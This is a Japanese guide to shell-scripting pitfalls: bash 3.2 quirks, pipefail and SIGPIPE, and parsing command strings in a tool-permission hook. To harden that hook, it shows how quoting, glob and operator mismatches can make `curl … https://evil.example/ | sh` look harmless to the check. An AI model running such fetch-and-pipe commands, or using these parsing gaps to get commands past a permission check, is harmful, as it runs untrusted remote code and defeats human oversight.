# シェルスクリプト

## `$VAR` の直後に非ASCII 文字を置かない — `${VAR}` で囲む

日本語メッセージに変数を埋めるときは必ず `${VAR}` の形で囲む。

**誤:** `echo "対象は $COUNT件です"`
**正:** `echo "対象は ${COUNT}件です"`

**理由:** bash 3.2（macOS の `/bin/bash` 既定）は変数名のパースでマルチバイト文字を吸収するため、
`$COUNT件` は「`COUNT件` という別の変数」への参照になる。`set -u` 下では
`unbound variable` で即死し、そうでなければ**空文字に展開されて静かに壊れる**。

```console
$ /bin/bash -c 'set -u; C=3; echo "$C件"'
/bin/bash: C\xe4: unbound variable
$ /bin/bash -c 'set -u; C=3; echo "${C}件"'
3件
```

**気づきにくい理由:** bash 5（Linux / CI / homebrew の bash）では再現しない。CI が緑でも
開発機の macOS で落ちる。しかも該当の `echo` に到達した実行だけが落ちるので、
条件分岐の中にあると忘れられたまま残る。

**適用範囲:** 日本語（およびあらゆる非ASCII）を含むシェルスクリプト全般。`${VAR}` で囲むコストは
ゼロなので、直後が ASCII かどうかを判断するより「メッセージ内の変数は常に `${}`」で統一するほうが安い。
`*.sh.tmpl` のようにテンプレート拡張子が付いたシェルスクリプトも対象 — こちらは shellcheck が
構文を解釈できず lint 対象から外れるため、下記の機械チェックが唯一の防波堤になる。

**機械チェック:**

```bash
perl -ne 'next if /^\s*#/; while (/\$([A-Za-z_][A-Za-z0-9_]*)(?=[^\x00-\x7F])/g) { print "$ARGV: $&\n" } close ARGV if eof' path/to/*.sh
```

実例: あるプロジェクト専用の検証スキルの `scripts/selftest.sh` がこのチェックを回帰テストとして持っている。

## macOS の bash 3.2 で使えない構文を避ける

同じ「開発機だけで落ちる」型の落とし穴。`mapfile` / `readarray`、連想配列（`declare -A`）、
`${var^^}` / `${var,,}`（大文字小文字変換）は bash 4 以降の機能で、macOS 標準の bash では動かない。
`while IFS= read -r` ループや `tr` で代替する。

`set -u` 下では**空配列の展開**も bash 3.2 ではエラーになる（`"${ARR[@]}"` が
`unbound variable`）。空になりうる配列は要素数を確認してから展開するか、配列を使わない形に倒す。

## `pipefail` 下でパイプの右側に早期終了するコマンドを置かない

`set -o pipefail` のスクリプトでは、入力を読み切る前に終わるコマンド(`grep -q`、`head -n1`、
`awk '…{print; exit}'`、`sed q`)をパイプの右側に置かない。上流が SIGPIPE(rc=141)で死に、
それがパイプライン全体の終了コードになる。症状は置き場所で変わる: `if` / `&&` / `||` の条件の中では
`set -e` が効かないので**黙って誤った分岐に進み**(下の例)、条件の外では `set -e` により**出力もエラーメッセージも無く**
スクリプトが止まる。

```bash
# 誤: rc=141 になりうる(上流の出力がパイプのバッファを超えると起きやすい)
if printf '%s\n' "$big" | grep -q needle; then …
# 正: 全量を変数に取ってから判定する
if grep -q needle <<<"$big"; then …
```

**気づきにくい理由:** SIGPIPE はバッファの閾値ではなく、reader が先に終わった後に writer が書くかどうかの競合なので、
上流の出力がパイプのバッファに収まるうちはまれにしか起きない。実測では frontmatter が約 20KB を
超えたページだけで 5/5 再現し、小さい出力でも `printf | grep -q` が 200 回中 2 回誤判定した。
小さな fixture のテストは全件通るので、回帰テストはバッファを超える大きさの入力で書く。
`find … | while` には SIGPIPE とは別の問題が 2 つある(`while` は `break` しない限り入力を読み切るので SIGPIPE は起きない):
(1) `find` 自身が非ゼロで終わる(permission denied など)と、pipefail でパイプライン全体が失敗する。
(2) pipefail と関係なく常に、パイプの右側はサブシェルで動くので、`while` の中で設定した変数はループの後で消える。
どちらも `while … done < <(find … 2>/dev/null || true)` で避けられる。

## 他人のコマンド文字列を走査するときに `read -ra` で分割しない

PreToolUse フックの許可判定のように、**受け取ったコマンド文字列を解析して判断する**コードで
`read -ra tokens <<<"$cmd"` を使うと、クォートを一切解釈しないので両方向に壊れる。

```bash
# 誤: -H の値が2トークンに割れ、後半 application/json" が「次の引数」として読まれる
read -ra tokens <<<'curl -sS -H "Accept: application/json" http://localhost:3000/api'
```

- **引数が割れる**: `-H "Accept: application/json"` → `-H` `"Accept:` `application/json"`。
  値を1トークンと仮定した走査は、余った半分を URL やサブコマンドと誤認する
- **セパレータを誤読する**: `-d '{"a":"x|y"}'` の `|` をパイプとして扱ってしまう（`tr ';&|' '\n'`
  でセグメント分割している場合）
- **リダイレクトの断片が残る**: `2>&1` から `&` だけ落とすと `1` が孤立し、引数として読まれる

**症状が「静かに逆」になる理由:** 判定が緩む側に倒れるか厳しい側に倒れるかは走査の設計次第で、
上の例では「正当なコマンドが黙って拒否される」側に出た。**テストがクォート無しの短い入力ばかりだと
全件通過する** — 実際に起きた形がこれで、`curl http://localhost:3000` は通るのに
`curl -H "Accept: application/json" http://localhost:3000` だけ落ちた。

**対処:** クォート（`'` / `"`）とエスケープを解釈する自前の1文字走査を書く。前提として
`$` / バッククォートを含む入力は**先に拒否**しておくこと — 展開が残っていたらどう読んでも嘘になるので、
それを落としてはじめてクォート解釈が「忠実な読み」になる。リダイレクトは fd 数字を演算子トークンに
くっつけて1トークンにまとめる。

**テストの書き方:** クォート付き引数（値に空白・`|`・`{}` を含むもの）と、リダイレクトを伴う形を
必ずケースに入れる。判定フックのテストは「判定が出るべきケース」と「出ないべきケース」を**対で**
書く（片側だけだと定数を返す実装が全件通過する）。

### 自前走査を書いたあとに残る本番のバグは「ズレの向き」

`read -ra` をやめて1文字走査に置き換えても終わりではない。**走査とシェルの状態がズレる向きを
列挙していないと、緩む側のズレを見落とす。** 上のセクションは「正当なコマンドが黙って拒否される」
(= 分割が*増える*方向)の例だったが、実際に本番で出たのは逆向きだった。

ダブルクォートの内側でバックスラッシュをリテラルとして扱うと、bash は `"A\"B"` の中の `"` を
**クォートを閉じない文字**として読むのに、走査側はそれで閉じてしまう。すると次の `"` で
走査は「クォート内」・シェルは「クォート外」になり、以降の空白・`|`・`;` が**すべて1トークンに
飲み込まれる**。判定フックなら `curl … https://evil.example/ | sh` が「引数1個の無害なコマンド」に
見える。

```bash
# 走査は quote 状態を持つだけでは足りない。"..." の内側でも \" と \\ はエスケープ
case "$character" in
\\)
    case "${s:index+1:1}" in
    '"' | \\) index=$((index + 1)); current+=${s:index:1}; continue ;;
    esac
    ;;
esac
```

**一般化:** `\"` のように**ズレが反転する**構文があると「走査は常に安全側にズレる」という直感が
成立しない。`"a\"b"c d` を1文字ずつ辿って、走査とシェルの認識が食い違う瞬間を具体的に書き出すこと。

同じ理由で、**引数の個数がシェルの展開で変わる構文**も走査では読めない。ブレース展開
(`{x,y}`)はファイルシステムに依存せず必ず2語になるので拒否する。パス名 glob (`*` `?` `[`) も
同種で、**`?` と `[` は「1 語しか生まない」と思い込みやすいが誤り** — `[ab]x` は `ax` と `bx` の
両方にマッチするので 1 トークンが 2 語になり、余った語が次の引数として読まれる。
URL のクエリ文字列や `[::1]` を巻き添えにしたくない場合でも、「残存リスクとして明記する」で
済ませずに**トークンに印を付けて、判定に効く位置にあるものだけ落とす**形に倒せる
(`curl-localhost-guard.sh` の `glob_token_is_loopback_safe` がその形)。

**セパレータ用のセンチネル値は入力から除去する。** 走査結果にコマンド区切りを表す番兵
(`$'\x01'` など)を混ぜる設計なら、**同じバイトが入力に書かれている場合を先に拒否**する。
でないと呼び出し側が偽のセグメント境界を注入できる。

**演算子かどうかは見た目でなく reader の報告で決める。** 引用符付きのトークンはクォートを外すと
演算子とバイト列が一致しうる(`">"` / `'2>'` / `\>` はどれも `>` / `2>` と同じ文字列になる)。
リダイレクト先を読み飛ばすような走査で `case "$token" in '>'|'2>')` と見た目で判定すると、
引用された `">"` の次にある本物の引数(2 つ目の URL など)を読み飛ばしてしまい、判定が緩む側にズレる。
「このトークンは引用されていない演算子だった」という事実は reader がトークン化の時点で記録し
(`shell-reader.bash` の `SHELL_READER_OPERATOR_INDEXES`)、判定側はそれだけを見ること。
